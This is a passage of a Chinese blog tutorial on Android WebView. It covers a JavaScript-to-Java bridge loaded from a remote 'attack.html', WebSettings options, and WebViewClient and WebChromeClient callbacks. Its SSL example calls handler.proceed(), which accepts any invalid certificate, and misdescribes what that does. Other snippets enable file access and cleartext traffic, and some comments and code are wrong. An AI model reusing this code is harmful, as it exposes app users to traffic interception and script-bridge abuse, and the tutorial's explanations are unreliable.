src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/3.png\" alt=\"image-20220726171648967\"></p>\n<p>运行程序，显示如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/4.png\" alt=\"image-20220726171737615\"></p>\n<h5 id=\"lt-2-gt-远程加载\"><a href=\"#lt-2-gt-远程加载\" class=\"headerlink\" title=\"&lt;2&gt;远程加载\"></a>&lt;2&gt;远程加载</h5><p>首先，我们直接在本地新建js文件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!<span class=\"variable constant_\">DOCTYPE</span> html&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Carson<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">         <span class=\"keyword\">function</span> <span class=\"title function_\">callAndroid</span>(<span class=\"params\"></span>)&#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"comment\">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            test.<span class=\"title function_\">hello</span>(<span class=\"string\">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">         &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">      </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">   <span class=\"comment\">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">   <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;button1&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/26.png\" alt=\"image-20220729155049524\"></p>\n<p>然后我们开启一个简易的http_server的监听</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/27.png\" alt=\"image-20220729155135353\"></p>\n<p>我们编写代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"type\">WebView</span> <span class=\"variable\">mWebView</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class=\"line\"><span class=\"type\">WebSettings</span> <span class=\"variable\">webSettings</span> <span class=\"operator\">=</span> mWebView.getSettings();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置与Js交互的权限</span></span><br><span class=\"line\">webSettings.setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class=\"line\"><span class=\"comment\">//参数1：Javascript对象名</span></span><br><span class=\"line\"><span class=\"comment\">//参数2：Java对象名</span></span><br><span class=\"line\">mWebView.addJavascriptInterface(<span class=\"keyword\">new</span> <span class=\"title class_\">AndroidtoJs</span>(), <span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class=\"line\">mWebView.loadData(<span class=\"string\">&quot;&quot;</span>,<span class=\"string\">&quot;text/html&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"comment\">// 加载JS代码</span></span><br><span class=\"line\"><span class=\"comment\">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class=\"line\"><span class=\"comment\">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class=\"line\">mWebView.loadUrl(<span class=\"string\">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 提供接口在Webview中供JS调用</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AndroidtoJs</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class=\"line\">    <span class=\"meta\">@JavascriptInterface</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">hello</span><span class=\"params\">(String msg)</span> &#123;</span><br><span class=\"line\">        Log.e(<span class=\"string\">&quot;WindXaa&quot;</span>,<span class=\"string\">&quot;Hello，&quot;</span> + msg);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们再次运行程序</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/28.png\" alt=\"image-20220729155443281\"></p>\n<p>这里就说明我们远程加载文件成功了，我们点击按钮</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/29.png\" alt=\"image-20220729160726979\"></p>\n<p>可以发现可以成功的通过JS调用Android代码</p>\n<h3 id=\"2-WebView使用详解\"><a href=\"#2-WebView使用详解\" class=\"headerlink\" title=\"2.WebView使用详解\"></a>2.WebView使用详解</h3><h4 id=\"（1）WebView常用方法\"><a href=\"#（1）WebView常用方法\" class=\"headerlink\" title=\"（1）WebView常用方法\"></a>（1）WebView常用方法</h4><p><strong>WebView的状态：</strong></p>\n<p>webView.onResume();</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 激活WebView为活跃状态，能正常执行网页的响应</span><br></pre></td></tr></table></figure>\n\n<p>webView.onPause();</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 当页面被失去焦点被切换到后台不可见状态，需要执行onPause</span><br><span class=\"line\">// 通过onPause动作通知内核暂停所有的动作，比如DOM的解析、plugin的执行、JavaScript执行。</span><br></pre></td></tr></table></figure>\n\n<p>webView.pauseTimers()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 当应用程序(存在webview)被切换到后台时，这个方法不仅仅针对当前的webview而是全局的全应用程序的webview</span><br><span class=\"line\">// 它会暂停所有webview的layout，parsing，javascripttimer。降低CPU功耗。</span><br></pre></td></tr></table></figure>\n\n<p>webView.resumeTimers()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// 恢复pauseTimers状态</span><br></pre></td></tr></table></figure>\n\n<p>rootLayout.removeView(webView)</p>\n<p>webView.destory()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">// webview调用destory时，webview仍绑定在Activity上</span><br><span class=\"line\">// 需要先从父容器中移除webview，然后再销毁webview</span><br></pre></td></tr></table></figure>\n\n<p><strong>前进、后退网页</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//是否可以后退</span></span><br><span class=\"line\">Webview.canGoBack()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//后退网页</span></span><br><span class=\"line\">Webview.goBack()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//是否可以前进</span></span><br><span class=\"line\">Webview.canGoForward()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//前进网页</span></span><br><span class=\"line\">Webview.goForward()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//以当前的index为起始点前进或者后退到历史记录中指定的steps</span></span><br><span class=\"line\"><span class=\"comment\">//如果steps为负数则为后退，正数则为前进</span></span><br><span class=\"line\">Webview.goBackOrForward(intsteps)</span><br></pre></td></tr></table></figure>\n\n<p>在不做任何处理前提下，浏览网页时点击系统的“Back”键时，整个 Browser 会调用 finish()而结束自身，因此需要在当前Activity中处理并消费掉该 Back 事件，当按下返回键时，调用goBack方法。</p>\n<p>我们可以做一些处理，让点击“Back”键后，让网页返回上一页而不是直接退出浏览器，此时我们可以在当前的Activity中处理Back事件，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onKeyDown</span><span class=\"params\">(<span class=\"type\">int</span> keyCode, KeyEvent event)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((keyCode == KEYCODE_BACK) &amp;&amp; mWebView.canGoBack()) &#123;</span><br><span class=\"line\">         mWebView.goBack();</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.onKeyDown(keyCode, event);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>清除缓存数据</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//清除网页访问留下的缓存</span><br><span class=\"line\">//由于内核缓存是全局的因此这个方法不仅仅针对webview而是针对整个应用程序.</span><br><span class=\"line\">Webview.clearCache(true);</span><br><span class=\"line\"></span><br><span class=\"line\">//清除当前webview访问的历史记录</span><br><span class=\"line\">//只会webview访问历史记录里的所有记录除了当前访问记录</span><br><span class=\"line\">Webview.clearHistory()；</span><br><span class=\"line\"></span><br><span class=\"line\">//这个api仅仅清除自动完成填充的表单数据，并不会清除WebView存储到本地的数据</span><br><span class=\"line\">Webview.clearFormData()；</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）常用类\"><a href=\"#（2）常用类\" class=\"headerlink\" title=\"（2）常用类\"></a>（2）常用类</h4><h5 id=\"lt-1-gt-WebSettings类\"><a href=\"#lt-1-gt-WebSettings类\" class=\"headerlink\" title=\"&lt;1&gt;WebSettings类\"></a><strong>&lt;1&gt;WebSettings类</strong></h5><p>作用：对WebView进行配置和管理</p>\n<p>配置步骤：</p>\n<p>第一步：添加访问网络权限（AndroidManifest.xml）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br></pre></td></tr></table></figure>\n\n<p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p>\n<p>第二步：生成一个WebView组件（有两种方式）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//方式1：直接在在Activity中生成</span></span><br><span class=\"line\"><span class=\"type\">WebView</span> <span class=\"variable\">webView</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">WebView</span>(<span class=\"built_in\">this</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class=\"line\"><span class=\"type\">WebView</span> <span class=\"variable\">webview</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure>\n\n<p>第三步：进行配置-利用WebSettings子类（常见方法）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//声明WebSettings子类</span></span><br><span class=\"line\"><span class=\"type\">WebSettings</span> <span class=\"variable\">webSettings</span> <span class=\"operator\">=</span> webView.getSettings();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class=\"line\">webSettings.setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//支持插件</span></span><br><span class=\"line\">webSettings.setPluginsEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">//设置自适应屏幕，两者合用</span></span><br><span class=\"line\">webSettings.setUseWideViewPort(<span class=\"literal\">true</span>); <span class=\"comment\">//将图片调整到适合webview的大小</span></span><br><span class=\"line\">webSettings.setLoadWithOverviewMode(<span class=\"literal\">true</span>); <span class=\"comment\">// 缩放至屏幕的大小</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//缩放操作</span></span><br><span class=\"line\">webSettings.setSupportZoom(<span class=\"literal\">true</span>); <span class=\"comment\">//支持缩放，默认为true。是下面那个的前提。</span></span><br><span class=\"line\">webSettings.setBuiltInZoomControls(<span class=\"literal\">true</span>); <span class=\"comment\">//设置内置的缩放控件。若为false，则该WebView不可缩放</span></span><br><span class=\"line\">webSettings.setDisplayZoomControls(<span class=\"literal\">false</span>); <span class=\"comment\">//隐藏原生的缩放控件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//其他细节操作</span></span><br><span class=\"line\">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); <span class=\"comment\">//关闭webview中缓存</span></span><br><span class=\"line\">webSettings.setAllowFileAccess(<span class=\"literal\">true</span>); <span class=\"comment\">//设置可以访问文件</span></span><br><span class=\"line\">webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class=\"literal\">true</span>); <span class=\"comment\">//支持通过JS打开新窗口</span></span><br><span class=\"line\">webSettings.setLoadsImagesAutomatically(<span class=\"literal\">true</span>); <span class=\"comment\">//支持自动加载图片</span></span><br><span class=\"line\">webSettings.setDefaultTextEncodingName(<span class=\"string\">&quot;utf-8&quot;</span>);<span class=\"comment\">//设置编码格式</span></span><br></pre></td></tr></table></figure>\n\n<p>常见方法：设置WebView缓存</p>\n<ul>\n<li>当加载 html 页面时，WebView会在&#x2F;data&#x2F;data&#x2F;包名目录下生成 database 与 cache 两个文件夹</li>\n<li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li>\n<li>是否启用缓存：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//优先使用缓存</span></span><br><span class=\"line\">WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//缓存模式如下：</span></span><br><span class=\"line\">    <span class=\"comment\">//LOAD_CACHE_ONLY: 不使用网络，只读取本地缓存数据</span></span><br><span class=\"line\">    <span class=\"comment\">//LOAD_DEFAULT: （默认）根据cache-control决定是否从网络上取数据。</span></span><br><span class=\"line\">    <span class=\"comment\">//LOAD_NO_CACHE: 不使用缓存，只从网络获取数据.</span></span><br><span class=\"line\">    <span class=\"comment\">//LOAD_CACHE_ELSE_NETWORK，只要本地有，无论是否过期，或者no-cache，都使用缓存中的数据</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//不使用缓存</span></span><br><span class=\"line\">WebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-WebViewClient类\"><a href=\"#lt-2-gt-WebViewClient类\" class=\"headerlink\" title=\"&lt;2&gt;WebViewClient类\"></a><strong>&lt;2&gt;WebViewClient类</strong></h5><p>用来处理各种通知 &amp; 请求事件</p>\n<p><strong>shouldOverrideUrlLoading()</strong></p>\n<p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Webview控件</span></span><br><span class=\"line\"><span class=\"type\">Webview</span> <span class=\"variable\">webview</span> <span class=\"operator\">=</span> (WebView) findViewById(R.id.webView);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//加载一个网页</span></span><br><span class=\"line\">webView.loadUrl(<span class=\"string\">&quot;http://www.google.com/&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//重写shouldOverrideUrlLoading()方法，使得打开网页时不调用系统浏览器， 而是在本WebView中显示</span></span><br><span class=\"line\">webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>()&#123;</span><br><span class=\"line\">     <span class=\"meta\">@Override</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">shouldOverrideUrlLoading</span><span class=\"params\">(WebView view, String url)</span> &#123;</span><br><span class=\"line\">           view.loadUrl(url);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p><strong>onPageStarted()</strong></p>\n<p>作用：开始载入页面调用的，我们可以设定一个loading的页面，告诉用户程序在等待网络响应。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>()&#123;</span><br><span class=\"line\">     <span class=\"meta\">@Override</span></span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">void</span>  <span class=\"title function_\">onPageStarted</span><span class=\"params\">(WebView view, String url, Bitmap favicon)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//设定加载开始的操作</span></span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;);</span><br></pre></td></tr></table></figure>\n\n<p><strong>onLoadResource()</strong></p>\n<p>作用：在加载页面资源时会调用，每一个资源（比如图片）的加载都会调用一次。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>()&#123;</span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">onLoadResource</span><span class=\"params\">(WebView view, String url)</span> &#123;</span><br><span class=\"line\">         <span class=\"comment\">//设定加载资源的操作</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n\n<p><strong>onReceivedError（）</strong></p>\n<p>作用：加载页面的服务器出现错误时（如404）调用。</p>\n<p>App里面使用webview控件的时候遇到了诸如404这类的错误的时候，若也显示浏览器里面的那种错误提示页面就显得很丑陋了，那么这个时候我们的app就需要加载一个本地的错误提示页面，即webview如何加载一个本地的页面</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//步骤1：写一个html文件（error_handle.html），用于出错时展示给用户看的提示页面</span></span><br><span class=\"line\"><span class=\"comment\">//步骤2：将该html文件放置到代码根目录的assets文件夹下</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//步骤3：复写WebViewClient的onRecievedError方法</span></span><br><span class=\"line\"><span class=\"comment\">//该方法传回了错误码，根据错误类型可以进行不同的错误分类处理</span></span><br><span class=\"line\">    webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>()&#123;</span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceivedError</span><span class=\"params\">(WebView view, <span class=\"type\">int</span> errorCode, String description, String failingUrl)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">switch</span>(errorCode)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> HttpStatus.SC_NOT_FOUND:</span><br><span class=\"line\">                    view.loadUrl(<span class=\"string\">&quot;file:///android_assets/error_handle.html&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>onReceivedSslError()</strong></p>\n<p>作用：处理https请求</p>\n<p>webView默认是不处理https请求的，页面显示空白，需要进行如下设置：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webView.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebViewClient</span>() &#123;    </span><br><span class=\"line\">        <span class=\"meta\">@Override</span>    </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceivedSslError</span><span class=\"params\">(WebView view, SslErrorHandler handler, SslError error)</span> &#123;    </span><br><span class=\"line\">            handler.proceed();    <span class=\"comment\">//表示等待证书响应</span></span><br><span class=\"line\">        <span class=\"comment\">// handler.cancel();      //表示挂起连接，为默认方式</span></span><br><span class=\"line\">        <span class=\"comment\">// handler.handleMessage(null);    //可做其他处理</span></span><br><span class=\"line\">        &#125;    </span><br><span class=\"line\">    &#125;);    </span><br></pre></td></tr></table></figure>\n\n<p><strong>c.WebChromeClient</strong></p>\n<p>作用：辅助 WebView 处理 Javascript 的对话框,网站图标,网站标题等等。</p>\n<p> <strong>onProgressChanged（）</strong></p>\n<p>作用：获得网页的加载进度并显示</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webview.setWebChromeClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebChromeClient</span>()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onProgressChanged</span><span class=\"params\">(WebView view, <span class=\"type\">int</span> newProgress)</span> &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (newProgress &lt; <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">              <span class=\"type\">String</span> <span class=\"variable\">progress</span> <span class=\"operator\">=</span> newProgress + <span class=\"string\">&quot;%&quot;</span>;</span><br><span class=\"line\">              progress.setText(progress);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n\n<p><strong>onReceivedTitle（）</strong></p>\n<p>作用：获取Web页中的标题</p>\n<p>每个网页的页面都有一个标题，比如<a href=\"http://www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？\">www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">webview.setWebChromeClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebChromeClient</span>()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceivedTitle</span><span class=\"params\">(WebView view, String title)</span> &#123;</span><br><span class=\"line\">       titleview.setText(title)；</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）WebView与JS的交互\"><a href=\"#（3）WebView与JS的交互\" class=\"headerlink\" title=\"（3）WebView与JS的交互\"></a>（3）WebView与JS的交互</h4><p>Android WebView与JS的交互：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/5.png\" alt=\"image-20220726171737615\"></p>\n<h5 id=\"lt-1-gt-Android调用JS\"><a href=\"#lt-1-gt-Android调用JS\" class=\"headerlink\" title=\"&lt;1&gt;Android调用JS\"></a>&lt;1&gt;Android调用JS</h5><p><strong><code>WebView.loadUrl()</code></strong></p>\n<p>首先，准备html文件，放到assets中</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">        <span class=\"keyword\">function</span> <span class=\"title function_\">callJS</span>(<span class=\"params\"></span>)&#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"title function_\">alert</span>(<span class=\"string\">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">        &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"language-xml\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Android调用JS方法测试<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/8.png\" alt=\"image-20220729093637679\"></p>\n<p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 设置与Js交互的权限</span></span><br><span class=\"line\"> webSettings.setJavaScriptEnabled(<span class=\"literal\">true</span>);</span><br><span class=\"line\"> <span class=\"comment\">// 设置允许JS弹窗</span></span><br><span class=\"line\"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">// 先载入JS代码</span></span><br><span class=\"line\"> <span class=\"comment\">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class=\"line\"> mWebView.loadUrl(<span class=\"string\">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"type\">Button</span> <span class=\"variable\">button</span> <span class=\"operator\">=</span> (Button) findViewById(R.id.button);</span><br><span class=\"line\"> button.setOnClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">View</span>.OnClickListener() &#123;</span><br><span class=\"line\">     <span class=\"meta\">@Override</span></span><br><span class=\"line\">     <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onClick</span><span class=\"params\">(View v)</span> &#123;</span><br><span class=\"line\">         <span class=\"comment\">// 通过Handler发送消息</span></span><br><span class=\"line\">         mWebView.post(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">             <span class=\"meta\">@Override</span></span><br><span class=\"line\">             <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                 <span class=\"comment\">// 